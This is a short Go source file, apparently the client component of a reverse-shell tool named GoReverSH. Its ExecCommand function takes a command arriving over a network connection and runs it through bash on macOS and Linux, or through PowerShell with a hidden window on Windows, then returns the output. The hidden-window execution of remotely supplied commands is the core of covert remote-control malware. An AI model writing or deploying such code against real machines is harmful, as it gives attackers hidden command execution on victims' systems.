package pkgclient

import (
	"GoReverSH/utils"
	"net"
	"os/exec"
	"runtime"
)

func ExecCommand(command string, conn net.Conn) (*utils.Output, error) {
	var cmd *exec.Cmd
	//mac linux or windows
	if runtime.GOOS == "darwin" || runtime.GOOS == "linux" {
		cmd = exec.Command("/bin/bash", "-c", command)
	} else if runtime.GOOS == "windows" {
		cmd = exec.Command("powershell.exe", "-NoProfile", "-WindowStyle", "hidden", "-NoLogo", command)
	}
	out, err := cmd.Output()
	if err != nil {
		return nil, err
	}

	output := utils.Output{Type: utils.MESSAGE, Message: out}

	return &output, nil
}
